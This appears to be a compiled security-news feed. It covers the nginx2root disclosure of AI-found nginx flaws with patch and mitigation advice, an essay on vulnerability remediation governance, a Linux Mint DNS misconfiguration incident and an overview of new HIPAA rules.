deploy the new packages as soon as they’re released. Teams should also check whether their Linux distributions or long-term support providers distribute PHP security fixes independently of the upstream release schedule. PHP 8.1 and older no longer receive security updates directly from the PHP project, although some Linux distributions and commercial vendors continue to provide backported patches. Organizations still running these versions should verify their vendor’s coverage rather than assume that an upstream release automatically protects their installations. “Users are strongly encouraged to prepare to upgrade promptly once the releases become available.” concludes the announcement. “Technical details and fixed version numbers will be published alongside the releases.” Follow me on Twitter: @securityaffairs and Facebook and Mastodon Pierluigi Paganini ( SecurityAffairs – hacking, CVE-2026-115560 )

items.title: nginx2root:AI Discovers Five Critical nginx Flaws and a Path to Root
items.summary: nginx2root exposes five critical nginx flaws and a Linux kernel bug that can lead to remote code execution and root access. Xint Research has disclosed nginx2root , five distinct nginx vulnerabilities plus one Linux kernel bug, each with a proven exploit. The worst of the five, now tracked as CVE-2026-123007, lets an unauthenticated attacker run code remotely, and chaining it with the kernel bug reaches root on the host. “This issue affects NGINX Plus or NGINX Open Source configurations that use HTTP/2. When NGINX processes undisclosed traffic, the flow control window can exceed the allowed threshold, potentially resulting in a heap buffer overflow typically followed by an NGINX worker segmentation fault. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR. ( CVE-2026-123007 )” reads the advisory . “An attacker could leverage this vulnerability to crash the NGINX worker process, corrupt its memory, or potentially execute code remotely. There is no control plane exposure; this is a data plane issue only.” Affected nginx versions run from 1.9.5 to 1.31.8, and the fix landed in 1.31.9. According to Zakir Durumeric , Co-Founder and CEO Censys, nearly 10M Internet services are running versions of Nginx vulnerable to the NGINX2Root CVEs. The bug sits in nginx’s HTTP/2 flow control, and it’s been there since nginx added HTTP/2 in 2015, eleven years ago. An attacker corrupts memory in an nginx worker, leaks memory addresses, and overwrites a pointer to a cleanup function that fires when a connection closes. “Specifically, the most severe vulnerability is in nginx HTTP/2 flow control. An unauthenticated remote attacker can corrupt memory in an nginx worker, leak memory addresses, and overwrite the pointer to a cleanup function that runs when a connection closes.” reads the advisory . “This can be used to execute commands with worker privileges and receive the output over an existing connection.” The figures show why this issue matters beyond nginx itself. In a Shodan scan on 10 November, 98.9% of nginx servers with a known version were running a vulnerable release. Xint also found that 88.6% of Fortune 500 companies use nginx. These figures show how widespread the vulnerable versions are, not how many servers can actually be attacked. Some servers may not have HTTP/2 enabled or may already include a fix provided by their software vendor. Still, administrators have a large number of systems to check. To move from control of an nginx worker to full root access, an attacker needs to exploit a second flaw in the Linux kernel’s SCTP code. Xint tested this attack chain in environments running on AWS, GCP and Azure, including systems reachable through a public IP address. Luxembourg’s cybersecurity response team, CIRCL, also confirmed that exploiting the kernel flaw is necessary to gain root access. No active attacks have been reported so far, and CVE-2026-123007 was not on CISA’s Known Exploited Vulnerabilities catalog at the time of writing. The discovery story is worth pausing on. nginx has been fuzzed by the best researchers for two decades, and a pre-auth RCE in it is rare, the last known one dating to 2013. “nginx runs roughly a third of the web and has been fuzzed and audited by the best researchers in the world for two decades. Pre-auth RCE in nginx almost never happens. The best known one is from 2013. This year every AI lab pointed models at it. Everyone figured the easy bugs were long gone.” continues the advisory. “While testing a new Xint capability ahead of ZeroDay Cloud, a Xint researcher pointed it at a slice of nginx, about 50,000 lines. He picked the target; Xint did the rest. Ninety minutes later it flagged high severity issues with reproduction steps specific enough to become a working exploit in under ten minutes.” That first find was a human picking the target and an AI doing the digging. What came next was different: Xint folded what it learned into a general feature, not tuned to nginx, and that version found the other four critical bugs with no human guidance. One of those four was also found independently by other researchers around the same time, so Xint wasn’t working in a vacuum. Four more flaws shipped fixes in the same release, each needing its own specific setup: a backend proxy running low on connections, a proxied server name built from variables combined with certain directives, HTTP/3 turned on, or nginx running as a mail proxy. All five vulnerabilities have a CVSS 4.0 score of 9.2 out of 10, making them critical. NGINX Plus is also affected across several release lines. The fixed versions 1.31.9 and 1.30.7 were released today, along with NGINX Plus versions 37.3.0.1 and 37.0.8.1 Check exposure with a simple test: run openssl s_client with -alpn h2 against your server, and if it answers “ALPN protocol: h2,” HTTP/2 is on. If you’re behind a CDN, test the origin directly, since an origin serving only HTTP/1.1 can’t be hit through HTTP/2 even if your CDN speaks it to visitors. Update to the fixed version and restart nginx fully, because a reload alone leaves the old binary running. If you can’t patch right away, turn off HTTP/2 on affected listeners as a stopgap. That blocks the worst flaw and one other, but not the remaining three, so it’s a bridge, not a destination. Distribution packages can carry a backported fix without changing the version string nginx -v reports, so check your vendor’s own advisory rather than trusting that number alone. Xint says the main value of this discovery goes beyond finding these vulnerabilities. It’s about building a process that can quickly turn the next AI-driven attack, similar to ARTEX , into security detections before attackers can take advantage of it. Below is a video PoC of the attack: Follow me on Twitter: @securityaffairs and Facebook and Mastodon Pierluigi Paganini ( SecurityAffairs – hacking, nginx2root)

Luxembourg’s cybersecurity response team, CIRCL, also confirmed that exploiting the kernel flaw is necessary to gain root access. No active attacks have been reported so far, and CVE-2026-123007 was not on CISA’s Known Exploited Vulnerabilities catalog at the time of writing.

The discovery story is worth pausing on. nginx has been fuzzed by the best researchers for two decades, and a pre-auth RCE in it is rare, the last known one dating to 2013.

“nginx runs roughly a third of the web and has been fuzzed and audited by the best researchers in the world for two decades. Pre-auth RCE in nginx almost never happens. The best known one is from 2013. This year every AI lab pointed models at it. Everyone figured the easy bugs were long gone.” continues the advisory. “While testing a new Xint capability ahead of ZeroDay Cloud, a Xint researcher pointed it at a slice of nginx, about 50,000 lines. He picked the target; Xint did the rest. Ninety minutes later it flagged high severity issues with reproduction steps specific enough to become a working exploit in under ten minutes.”

That first find was a human picking the target and an AI doing the digging. What came next was different: Xint folded what it learned into a general feature, not tuned to nginx, and that version found the other four critical bugs with no human guidance. One of those four was also found independently by other researchers around the same time, so Xint wasn’t working in a vacuum.

Four more flaws shipped fixes in the same release, each needing its own specific setup: a backend proxy running low on connections, a proxied server name built from variables combined with certain directives, HTTP/3 turned on, or nginx running as a mail proxy.

All five vulnerabilities have a CVSS 4.0 score of 9.2 out of 10, making them critical. NGINX Plus is also affected across several release lines. The fixed versions 1.31.9 and 1.30.7 were released today, along with NGINX Plus versions 37.3.0.1 and 37.0.8.1

Check exposure with a simple test: run openssl s_client with -alpn h2 against your server, and if it answers “ALPN protocol: h2,” HTTP/2 is on. If you’re behind a CDN, test the origin directly, since an origin serving only HTTP/1.1 can’t be hit through HTTP/2 even if your CDN speaks it to visitors. Update to the fixed version and restart nginx fully, because a reload alone leaves the old binary running.

If you can’t patch right away, turn off HTTP/2 on affected listeners as a stopgap. That blocks the worst flaw and one other, but not the remaining three, so it’s a bridge, not a destination. Distribution packages can carry a backported fix without changing the version string nginx -v reports, so check your vendor’s own advisory rather than trusting that number alone.

Xint says the main value of this discovery goes beyond finding these vulnerabilities. It’s about building a process that can quickly turn the next AI-driven attack, similar to ARTEX, into security detections before attackers can take advantage of it.

items.title: Vulnerability management: The cybersecurity industry is still solving the wrong problem
items.summary: We have never been short of vulnerabilities. We have always struggled with remedial work. For decades, the cybersecurity industry has approached vulnerability management from the wrong end. The emphasis has consistently been on finding vulnerabilities, cataloguing them, scoring them and, more recently, prioritising them through increasingly sophisticated risk models. An entire industry has developed around vulnerability scanning, exposure management, threat intelligence and remediation prioritization. Artificial intelligence is now promising to take those capabilities to another level. But there is something fundamentally wrong with that approach. The real challenge in vulnerability management has never been identifying what needs fixing. It has always been getting the remedial work done. Most large organizations already know they have significant numbers of vulnerabilities across their technology estates. They have known for years. They have dashboards, reports, inventories, risk ratings and remediation backlogs. What they frequently lack is the organizational machinery to translate that knowledge into effective, sustained remedial action. And that is not primarily a technology problem. The uncomfortable reality behind remediation backlogs Consider what happens when a large enterprise identifies a critical vulnerability. The security team assesses its severity and potential impact. It raises a ticket, assigns a priority, identifies an owner and requests remediation. On paper, the process looks straightforward. In practice, that is often where the real problems begin. The infrastructure team may be managing ageing systems with complex dependencies. The development team may have committed to a demanding release schedule. Production operations may be unwilling to accept additional downtime. Business stakeholders may resist disruption to revenue-generating services. Some systems may have very limited maintenance windows. Others may require extensive regression testing before deploying patches. Legacy applications may depend on components that cannot easily be upgraded. And ownership itself may be disputed. Security teams frequently have the responsibility to identify and report vulnerabilities but lack the authority to enforce remediation. Technology teams control the systems but may have competing priorities and insufficient resources. The result is familiar: escalating tickets, repeated exceptions, missed deadlines, unresolved disputes and growing remediation backlogs. None of these problems can be solved simply by producing a better vulnerability score. Prioritization is necessary, but it is not the answer The industry has increasingly recognized that organizations cannot remediate everything. That has driven the development of risk-based vulnerability management, exploitability intelligence, asset criticality models and sophisticated exposure prioritization platforms. These capabilities have genuine value: There is an obvious difference between a vulnerability that is actively exploited on an internet-facing critical system and one that exists on an isolated, low-value asset. But prioritization is only the beginning of a management process. It is not its outcome: A perfectly prioritized remediation backlog remains a backlog. In many organizations, the difficulty is not deciding which vulnerabilities matter most. It is securing agreement on who will fix them, when the work will take place and who has the authority to resolve conflicts or accept the risk. These are matters of governance, accountability and business priorities. The cybersecurity industry remains disproportionately focused on the what , when the real challenge lies in the how and the who . AI is about to make the problem considerably worse Artificial intelligence is fundamentally changing the economics of vulnerability discovery. AI-assisted tools can analyse code, identify weaknesses and accelerate vulnerability research on a scale and at a speed that would previously have required substantial human effort. According to Google Threat Intelligence Group , monthly vulnerability disclosures more than doubled between January and August 2026, while observed exploitation also increased significantly. AI is contributing to that acceleration, although changes in disclosure practices also influence the figures. The consequences for large organizations could be significant. We are moving towards a world where the identification of vulnerabilities becomes increasingly automated, increasingly inexpensive and potentially continuous. But what happens when the volume of identified vulnerabilities increases dramatically while the organization’s capacity to remediate them remains essentially unchanged? The answer is predictable: Larger backlogs. More pressure on technology teams. More exceptions. More disputes over priorities. And potentially greater exposure, despite unprecedented visibility into technical weaknesses. The Cloud Security Alliance has already highlighted this growing disconnect between accelerated vulnerability discovery and the capacity of organizations to absorb and remediate findings. AI is industrialising vulnerability discovery while remediation remains trapped in organizational structures designed for another era. That is the real emerging challenge. AI cannot negotiate a production maintenance window Of course, AI can also contribute to remediation. It can establish proofs of concept, generate and test fixes, propose configuration changes, analyse dependencies and automate certain deployment activities. These are important developments, and organizations should embrace them where appropriate. But their practical impact must not be overstated. AI cannot independently decide that a critical production system should be taken offline during a peak business period. It cannot assume accountability for disrupting customer services or resolve competing priorities between a business unit, an infrastructure team and the security function. It cannot simply override legacy dependencies, contractual obligations or regulatory constraints. Even where AI can technically generate a suitable fix, somebody still needs to validate it, approve its deployment, ensure that the fix has not broken something else and verify that remediation has been successful. Some of those steps can be automated. Others require judgement, authority and organizational coordination. The more powerful AI becomes, the more visible those remaining management bottlenecks will be. And this is where the traditional cybersecurity approach is increasingly inadequate. Vulnerability management needs an operating model, not another dashboard What large organizations need is not simply better vulnerability management technology. They need a remediation operating model that establishes clear accountability across security, development, infrastructure, operations and business management. That model should address several fundamental questions. Who owns the remediation of vulnerabilities affecting shared platforms or complex applications? Who allocates the necessary resources? Who can authorize emergency changes? Who resolves disagreements when remediation conflicts with business priorities? How are maintenance windows negotiated and secured? How are persistent exceptions challenged? Who accepts the residual business risk when remediation cannot be completed within the expected timeframe? And, crucially, who is responsible for ensuring that agreed actions happen? These responsibilities cannot be left to informal relationships between technical teams or to the persistence of individual security managers. They need to be embedded in management processes, supported by executive authority and reinforced through meaningful performance measures. Security should provide risk intelligence, challenge and assurance. Technology teams should own the delivery of remediation within their environments. Business management should participate in decisions where operational disruption or investment trade-offs are unavoidable. The CISO’s role is to help establish and oversee that machinery, not to become the organization’s chief ticket chaser. Measuring remediation effectiveness, not just reporting activity There is also a fundamental problem with how vulnerability management performance is measured. Too many organizations remain focused on the number of vulnerabilities identified, severity distributions, compliance with remediation deadlines and the volume of outstanding findings. Those indicators have their place, but they can encourage an administrative approach to vulnerability management: Closing tickets becomes a proxy for reducing risk. What matters is whether material exposures are being eliminated within acceptable timeframes and whether the organization can demonstrate that remediation has worked. Management should pay particular attention to recurring remediation failures, ageing high-risk exposures, operational bottlenecks, the effectiveness of exception handling and the time required to implement verified fixes. The distinction between a vulnerability being reported as resolved and genuinely being remediated is essential. AI can help generate more accurate and timely evidence. But it cannot substitute for accountability over the results. Auditability and regulatory obligations add another critical dimension to this challenge. Regulators increasingly expect organizations not only to identify and assess vulnerabilities, but also to demonstrate that appropriate remedial actions have been taken within reasonable timeframes. This requires clear ownership, documented decisions, traceable exceptions periodically reviewed and reliable evidence that remediation has been completed. As AI accelerates vulnerability discovery and potentially automates parts of the remediation process, maintaining an auditable chain of accountability becomes even more important. Ultimately, compliance cannot rest on the ability to identify problems: It needs to rest on the ability to demonstrate that they have been effectively addressed . The real opportunity for AI is to transform execution This is where I believe the cybersecurity industry should concentrate its attention. Rather than simply applying AI to discover more vulnerabilities and refine their prioritization or their treatment, vendors and practitioners should focus on how AI can accelerate the entire remediation lifecycle. That means understanding dependencies, identifying suitable deployment opportunities, preparing changes, automating testing, coordinating workflows, validating results and providing management with reliable evidence of progress across the whole cycle. In highly automated environments, AI agents may eventually execute substantial portions of that process under clearly defined controls. But the objective should not be automation for its own sake: It should be to reduce the friction between identifying a problem and resolving it. And that requires technology to be designed around a functioning governance model, rather than expecting governance to emerge from the technology. The technology will change. The management problem will not. I have argued for years that cybersecurity is fundamentally a leadership and management challenge supported by technology. Vulnerability management provides perhaps one of the clearest demonstrations of that principle. The same structural problems that prevented organizations from patching critical systems fifteen years ago remain visible today: fragmented responsibilities, competing priorities, operational constraints, weak governance and insufficient management follow-through. AI will not make those problems disappear. On the contrary, by accelerating vulnerability discovery and shortening the time available to respond, it is exposing them more brutally than ever. The organizations that succeed will not necessarily be those with the most sophisticated vulnerability discovery capabilities. They will be those that have built the governance, accountability and operational discipline required to translate technical intelligence into effective remedial action. The future of vulnerability management will not be determined by how quickly we can find what is wrong. It will be determined by how effectively organizations can get things fixed. And that has always been a management problem.

items.title: Linux Mint’s Domain Spent Four Hours on a Hosting Company’s Parking Page
items.summary: For about four and a half hours on 19 November, Linux Mint’s website, forums and update server showed a hosting company’s parking page instead of Linux Mint. Anyone who opened linuxmint.com got a certificate warning first. Behind it was a Swedish page from Websupport, a hosting company, offering to help you find a domain name. Linux Mint’s own update server, the one every Mint installation checks by default, served the same page, so Update Manager failed with signature errors. The domain registration was never touched. What changed was the domain’s DNS zone at Linux Mint’s DNS provider: at about 03:45 UTC it started sending every address under linuxmint.com to the parking server, and at 08:09 UTC a new version put Linux Mint’s own records back. At 08:20 UTC the website, blog, update server and mail records worked again. The forums still didn’t resolve. The first public report we found is a post by It’s FOSS at 05:06 UTC. When we published, Linux Mint hadn’t explained what happened, and we found no news coverage.

items.title: New HIPAA Regulations in 2026
items.summary: New HIPAA regulations have been finalized in 2026. The long-awaited modifications to the HIPAA Privacy Rule that were first mooted in late 2020 have progressed to a final rule, which was issued by the HHS on November 16, 2026, and is due to be published in the Federal Register on November 19, 2026. HIPAA Privacy Rule Modifications Finalized in 2026 The 2026 new HIPAA regulations serve three main purposes: Strengthening the individual right of access to protected health information, facilitating care coordination, and reducing the regulatory burden on HIPAA covered entities. It has taken 8 years from the initial Request for Information for the final rule to be issued, and 6 years from the Notice of Proposed Rulemaking. The final rule – HIPAA Privacy Rule: Changes to Support Coordinated Care and Individual Engagement and Reduce Regulatory Burdens – implements important updates to the HIPAA Privacy Rule. These include shortening the time for providing copies of protected health information from 30 to 15 days, allowing individuals to request that their PHI be sent to a personal health app or person of their choosing, clarifications to facilitate care coordination and support case management, and measures to reduce the administrative burden on covered entities. The modifications, detailed later in this article, take effect on January 18, 2027, and the compliance date for all but the changes to business associate agreements is July 17, 2027. New HIPAA Security Rule Regulations Delayed Until 2027 New HIPAA Security Rule regulations that were proposed in January 2025 had a target date of May 2026 for a final rule. The final rule has been delayed as the Department of Health and Human Services (HHS) Office for Civil Rights (OCR) stated that it would first focus on finalizing the Privacy Rule update. A final rule implementing the proposed Security Rule changes now has a target date of July 2027. Your privacy respected – Read our privacy policy Your privacy respected – Read our privacy policy If a final rule is released, these new HIPAA regulations will have a significant impact on all HIPAA-regulated entities operationally and financially, as they will require significant investment in cybersecurity and substantial changes to security practices and procedures. The proposed changes include dropping the distinction between required and addressable implementation specifications, adopting current cybersecurity best practices, mandatory encryption and multifactor authentication (with limited exceptions), regular security testing, annual compliance audits, and more prescriptive risk analysis requirements. Part 2 Regulations Aligned with HIPAA For several years, new HIPAA regulations have been under consideration concerning how substance use disorder (SUD) and mental health information records are treated and protected. SUD records are covered by the Confidentiality of Substance Use Disorder Patient Records (42 CFR Part 2) regulations, which serve to protect the privacy of substance use disorder patients who seek treatment at federally assisted programs, whereas other healthcare data is covered under HIPAA. There have been calls from many healthcare stakeholder groups to align the Part 2 regulations more closely with HIPAA, so all healthcare data has equal protection. This would allow clinicians to view patients’ entire medical records, including SUD records, to get a complete view of a patient’s health history to inform treatment decisions. If details of treatment for SUD are withheld from doctors, there is a risk that a patient may be prescribed opioids when they are in recovery. While there are good reasons why these records need to be treated differently, as part of efforts to tackle the opioid crisis, the Substance Abuse and Mental Health Services Administration (SAMHSA) and OCR moved to align the Part 2 regulations more closely with HIPAA. There was progress on this front in 2020 through the Coronavirus Aid, Relief, and Economic Security (CARES) Act, which required the HHS to align the Part 2 regulations more closely with HIPAA. In 2022, a Notice of Proposed Rulemaking was published in the Federal Register detailing Part 2 and HIPAA changes as mandated by the CARES Act to increase care coordination and better align these regulations, and a final rule was issued in February 2024. The new rule took effect on April 16, 2024, and the compliance date was February 16, 2026. Other Recent Changes to the HIPAA Rules In recent years, new HIPAA regulations and changes attributable to related Acts have mostly had a minimal impact on HIPAA compliance. A short-lived change was implemented in April 2024 when a final rule was published updating the HIPAA Privacy Rule to strengthen reproductive health care privacy. In June 2025, the HIPAA Privacy Rule to Support Reproductive Health Care Privacy was vacated nationally by a Texas judge as it was deemed unlawful. OCR has now suspended enforcement of the vacated provisions. Prior to these updates, there was a major update to the HIPAA Rules in 2013 when the HIPAA Omnibus Final Rule introduced new HIPAA regulations mandated by the Health Information Technology for Economic and Clinical Health (HITECH) Act. Since then, most HIPAA changes have consisted of amendments to existing standards to accommodate changes to other laws, Executive Orders, and to implement new transaction code sets. This article explains the implemented and proposed new HIPAA regulations and can be used in conjunction with our HIPAA compliance checklist to help better understand how the HIPAA updates for 2026 may impact HIPAA compliance.
